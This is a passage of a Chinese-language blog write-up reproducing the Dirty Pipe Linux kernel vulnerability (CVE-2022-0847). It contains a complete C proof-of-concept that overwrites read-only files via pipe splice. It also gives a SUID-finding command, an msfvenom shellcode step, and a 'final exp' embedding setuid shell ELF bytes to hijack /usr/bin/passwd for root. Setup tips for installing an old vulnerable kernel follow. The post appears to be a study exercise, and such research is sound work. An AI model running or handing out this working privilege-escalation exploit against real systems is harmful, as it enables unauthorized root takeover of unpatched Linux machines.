class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\nkorey0sh1\n&quot;</span>, <span class="hljs-number">11</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>éšä¾¿ç”¨qemuèµ·äº†ä¸ªç¯å¢ƒï¼Œkernel version &#x3D; 5.8</p>
<p>æ•ˆæœè¿˜æ˜¯å¾ˆæˆåŠŸçš„</p>
<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321143920.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />

<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å¸¸è§„çš„<strong>suid</strong>ææƒæ–¹å¼</p>
<p>æŸ¥çœ‹å…·æœ‰rootæƒé™çš„suidæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>æ­¤å¤„è¿˜æ˜¯é€‰æ‹©è€æœ‹å‹&#x2F;usr&#x2F;bin&#x2F;passwd</p>
<p>ç”¨msfç”Ÿæˆææƒçš„shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure>



<h3 id="final-exp"><a href="#final-exp" class="headerlink" title="final exp"></a>final exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    <span class="hljs-comment">//ä»ç¬¬äºŒä½å¼€å§‹è¦†å†™</span><br>    write(pipe_fd[<span class="hljs-number">1</span>], &amp;attack_data[<span class="hljs-number">1</span>], data_len<span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¯å¢ƒï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321201804.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿è¡Œæ•ˆæœ</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5365682d6c51a6882c74dd06b604bb9.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="some-tricks"><a href="#some-tricks" class="headerlink" title="some tricks"></a>some tricks</h1><p>ç¬”è€…åœ¨æœ€åä¸€ç›´è‹¦äºæ‰¾ä¸åˆ°åˆé€‚çš„kernelç‰ˆæœ¬çš„è™šæ‹Ÿæœºå‘œå‘œå‘œå‘œå‘œï¼Œå› ä¸ºä¸‹äº†ä¸ªæŒºå¤æ—©ç‰ˆæœ¬çš„ubuntu20ï¼Œè§‰å¾—åº”è¯¥èƒ½ç¬¦åˆç‰ˆæœ¬è¦æ±‚</p>
<p>ç»“æœç©æ„ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œä¸‹ä¸‹æ¥æ¼æ´éƒ½æ˜¯è¢«patchçš„</p>
<p>æœ€åå‘ç°äº†<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-919002.htm">xi@0ji233</a> çš„æ–‡ç« ï¼Œäº†è§£åˆ°äº†ä¸€ç§ååˆ†æ–¹ä¾¿å¿«æ·çš„æ›´æ¢kernelç‰ˆæœ¬çš„æ–¹æ³•</p>
<p>é¦–å…ˆå…ˆç”¨aptå¯»æ‰¾ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-cache search linux | grep 5.8.<br></code></pre></td></tr></table></figure>

<p>é€‰æ‹©è¿™ä¸ª</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321203416.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¸‹è½½</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install linux-image-5.8.0-63-generic<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ›´æ”¹grubå¯åŠ¨é¡¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit /etc/default/grub<br></code></pre></td></tr></table></figure>

<p>æ”¹æˆè¿™æ ·</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span><br><span class="hljs-comment"># /boot/grub/grub.cfg.</span><br><span class="hljs-comment"># For full documentation of the options in this file, see:</span><br><span class="hljs-comment">#   info -f grub -n &#x27;Simple configuration&#x27;</span><br><br><span class="hljs-attr">GRUB_DEFAULT</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">GRUB_TIMEOUT_STYLE</span>=hidden<br><span class="hljs-attr">GRUB_TIMEOUT</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">GRUB_DISTRIBUTOR</span>=`lsb_release -i -s <span class="hljs-number">2</span>&gt; /dev/null || echo Debian`<br><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;text&quot;</span><br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US&quot;</span><br><br><span class="hljs-comment"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="hljs-comment"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="hljs-comment"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="hljs-comment">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><br><span class="hljs-comment"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="hljs-comment">#GRUB_TERMINAL=console</span><br><br><span class="hljs-comment"># The resolution used on graphical terminal</span><br><span class="hljs-comment"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="hljs-comment"># you can see them in real GRUB with the command `vbeinfo&#x27;</span><br><span class="hljs-comment">#GRUB_GFXMODE=640x480</span><br><br><span class="hljs-comment"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span><br><span class="hljs-comment">#GRUB_DISABLE_LINUX_UUID=true</span><br><br><span class="hljs-comment"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="hljs-comment">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br><br><span class="hljs-comment"># Uncomment to get a beep at grub start</span><br><span class="hljs-comment">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span><br></code></pre></td></tr></table></figure>

<p>æ›´æ–°<code>grub</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-grub<br></code></pre></td></tr></table></figure>

<p>rebooté‡å¯åç‹‚æŒ‰<strong>SHIFT+TAB</strong>è¿›å…¥å¼•å¯¼æ¨¡å¼ï¼Œé€‰æ‹©é«˜çº§è®¾ç½®ï¼Œé€‰æ‹©æ–°ä¸‹è½½çš„å†…æ ¸ç‰ˆæœ¬ï¼Œå³å¯å®Œæˆç¯å¢ƒæ­å»º</p>
<h1 id="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"><a href="#0xffï¼šå†™åœ¨æœ€åçš„æœ€å" class="headerlink" title="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"></a>0xffï¼šå†™åœ¨æœ€åçš„æœ€å</h1><p><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability â€” The Dirty Pipe Vulnerability documentation (cm4all.com)</a></p>
<p>æ‹œè¯»å®Œæ¼æ´å‘ç°è€…çš„åšå®¢ï¼Œæ•¬ä½©ä»–å±…ç„¶èƒ½ä»ä¸€æ¬¡å°å°çš„<strong>CRC</strong>æ ¡éªŒé”™è¯¯å…¥æ‰‹ï¼Œæ·±æŒ–è¿‘ä¸€å¹´æ—¶é—´ï¼ŒæŒ–æ˜åŸæœ¬å¹¶ä¸ç†Ÿæ‚‰çš„<strong>Linux Kernel</strong>ï¼Œ</p>
<p>å¹¶æœ€ç»ˆå‘ç°äº†<strong>Dirty Pipe</strong>è¿™ä¸€å¨åŠ›å·¨å¤§çš„å†…æ ¸<code>0day</code></p>
<p>ä½œè€…çš„æ¢ç´¢ç²¾ç¥ï¼Œå€¼å¾—ç¬”è€…å­¦ä¹ </p>
<p><strong>è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</strong></p>
<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-280442.htm">CVE-2022-0847 dirtypipeæ¼æ´å¤ç°-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E7%AE%A1%E9%81%93">ã€CVE.0x06ã€‘CVE-2022-0847 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/OS/" class="print-no-link">#OS</a>
      
        <a href="/tags/linux/" class="print-no-link">#linux</a>
      
        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
      
        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2022-0847ï¼ˆDirty Pipe) Remake</div>
      <div>http://example.com/2024/03/18/dirtypipe/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>korey0sh1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´3æœˆ18æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/28/dirtycred/" title="CVE-2021-4154 Remake">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-4154 Remake</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/02/27/dirtycow/" title="CVE-2016-5195(Dirty Cow) Remake">
                        <span class="hidden-mobile">CVE-2016-5195(Dirty Cow) Remake</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
